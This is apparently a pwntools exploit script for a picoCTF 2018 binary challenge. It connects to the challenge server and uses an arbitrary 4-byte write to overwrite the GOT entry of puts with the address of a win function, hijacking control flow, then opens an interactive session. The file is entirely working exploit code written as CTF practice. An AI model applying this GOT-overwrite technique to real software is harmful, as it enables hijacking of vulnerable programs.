# coding=utf-8
from pwn import *

win = '804854b'
puts = '804a00c'

r = remote('2018shell.picoctf.com', 54664)
#r = process('./auth')
r.recvuntil('Where would you like to write this 4 byte valu')
r.sendline(puts)

r.recvuntil('now what value would you like to write to')
r.sendline(win)

r.interactive()
